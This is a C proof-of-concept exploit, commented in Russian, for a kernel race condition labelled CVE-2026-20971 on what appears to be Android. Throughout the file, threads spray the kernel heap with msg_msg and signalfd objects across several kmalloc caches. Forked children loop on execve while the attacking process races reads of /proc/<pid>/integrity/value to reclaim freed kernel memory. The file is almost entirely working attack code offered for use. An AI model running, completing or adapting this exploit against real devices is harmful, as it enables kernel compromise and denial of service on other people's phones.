#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <string.h>
#include <sched.h>
#include <signal.h>
#include <sys/signalfd.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <pthread.h>
#include <sys/resource.h>
#include <errno.h>

// Структура для отправки сообщений. 
// Размер mtext определяет, в какой кэш ядра попадет объект msg_msg.
struct msgbuf {
    long mtype;
    char mtext[1024]; // Максимальный размер для примера
};

// Поток для спрея через msg_msg (передаем размер как аргумент)
void* spray_msg_thread(void* arg) {
    int size = *(int*)arg;
    struct msgbuf msg;
    msg.mtype = 1; 
    memset(msg.mtext, 'A', size);

    // Создаем очередь сообщений
    int qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (qid < 0) return NULL;

    long count = 0;
    while(1) {
        // Отправляем сообщение нужного размера (IPC_NOWAIT чтобы не блокироваться)
        if (msgsnd(qid, &msg, size, IPC_NOWAIT) < 0) {
            // Если очередь переполнена, удаляем её и создаем новую
            msgctl(qid, IPC_RMID, NULL);
            qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
            if (qid < 0) { usleep(1000); }
        }
        count++;
    }
    return NULL;
}

void* spray_signalfd_thread(void* arg) {
    sigset_t mask;
    sigemptyset(&mask);
    sigaddset(&mask, SIGUSR1);
    while(1) {
        int sfd = signalfd(-1, &mask, 0);
        if (sfd < 0) usleep(1000);
    }
    return NULL;
}

int main() {
    setbuf(stdout, NULL);

    // Поднимаем лимиты
    struct rlimit rlim = {200000, 200000};
    setrlimit(RLIMIT_NOFILE, &rlim);
    setrlimit(RLIMIT_MSGQUEUE, &rlim);

    printf("[*] CVE-2026-20971 Race Condition PoC (Shotgun Spray)\n");

    // 1. Запускаем потоки-спреи разного размера
    // Выбираем размеры, кратные 32 байтам, покрывая kmalloc-64, 128, 256, 512, 1024
    int sizes[] = {32, 96, 224, 480, 960}; 
    for (int i = 0; i < 5; i++) {
        pthread_t tid;
        pthread_create(&tid, NULL, spray_msg_thread, &sizes[i]);
        pthread_detach(tid);
    }

    // + один поток для signalfd (на всякий случай)
    pthread_t tid_sig;
    pthread_create(&tid_sig, NULL, spray_signalfd_thread, NULL);
    pthread_detach(tid_sig);

    // 2. Запускаем 4 дочерних процесса для execve
    pid_t pids[4];
    for (int i=0; i<4; i++) {
        pids[i] = fork();
        if (pids[i] == 0) {
            cpu_set_t set;
            CPU_ZERO(&set);
            CPU_SET(1 + (i % 3), &set); 
            sched_setaffinity(0, sizeof(set), &set);
            
            char *argv[] = {"/system/bin/true", NULL};
            char *envp[] = {NULL};
            while (1) {
                execve("/system/bin/true", argv, envp);
                _exit(1);
            }
        }
    }

    printf("[*] Started 4 children and 6 spray threads.\n");

    // 3. Атакующий процесс
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set); 
    sched_setaffinity(0, sizeof(set), &set);

    char *buf = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    char path[64];
    long iterations = 0;

    while (1) {
        int idx = rand() % 4;
        snprintf(path, sizeof(path), "/proc/%d/integrity/value", pids[idx]);

        madvise(buf, 4096, MADV_DONTNEED);

        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            // Page fault здесь дает время спрею занять освобожденную память
            read(fd, buf, 4096); 
            close(fd);
        }
        
        iterations++;
        if (iterations % 100000 == 0) {
            printf("[*] Iterations: %ld\n", iterations);
        }
        
        // Если телефон будет тормозить из-за нехватки памяти - 
        // это ожидаемо при "дробовике".
    }
    return 0;
}